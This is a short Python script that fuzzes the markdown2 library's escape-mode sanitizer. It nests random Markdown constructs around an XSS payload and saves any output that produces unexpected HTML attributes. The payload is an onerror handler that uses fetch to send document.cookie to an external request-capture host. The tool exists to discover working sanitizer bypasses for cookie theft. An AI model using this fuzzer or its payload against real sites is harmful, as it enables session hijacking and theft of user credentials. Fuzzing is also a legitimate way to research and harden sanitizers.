import markdown2
import random
from bs4 import BeautifulSoup

def generate_random_md(codes):
    random_md = []
    length = random.randint(1, 50)
    payload = "//onerror=fetch(\"http://g106vnrl.requestrepo.com/?c=\"+document.cookie)"

    for i in range(length):
        random_index = random.randint(0, len(codes) - 1)
        if i == 0:
            random_md.append(codes[random_index].format(p=payload))
        else:
            random_md.append(codes[random_index].format(p=random_md[-1]))

    return ' '.join(random_md)


def check_for_unusual_attributes(element):
    usual_attributes = ['alt','src','href','title']
    found_attributes = set()
    soup = BeautifulSoup(element, 'html.parser')

    for tag in soup.find_all(True):
        for attr in tag.attrs:
            if attr not in usual_attributes:
                found_attributes.add(attr)
    
    return found_attributes

def start_fuzzing():
    codes = ["[{p}]({p})","https://x.com/?{p}","id=1","({p})","![{p}]({p})","`{p}`","*{p}*","> {p}","__{p}__",
    "# {p}","- {p}","[{p}]:","{p}\n-------------","> 1. {p}","[{p}][]\n[{p}]: http://{p}","![{p}][]\n[{p}]: http://{p}? \"{p}\"", "<p>{p}</p>", "<svg>"]

    try:
        while True:
            random_md = generate_random_md(codes)
            html = markdown2.markdown(random_md, safe_mode="escape")
            unusual_attributes = check_for_unusual_attributes(html)
            if unusual_attributes:
                print('Generated BBCode:', random_md)
                print('Unusual attributes found:', unusual_attributes)
                with open("payload.txt","w") as file:
                    file.write(random_md)
                break 
    except:
        pass

if __name__ == "__main__":
    start_fuzzing()
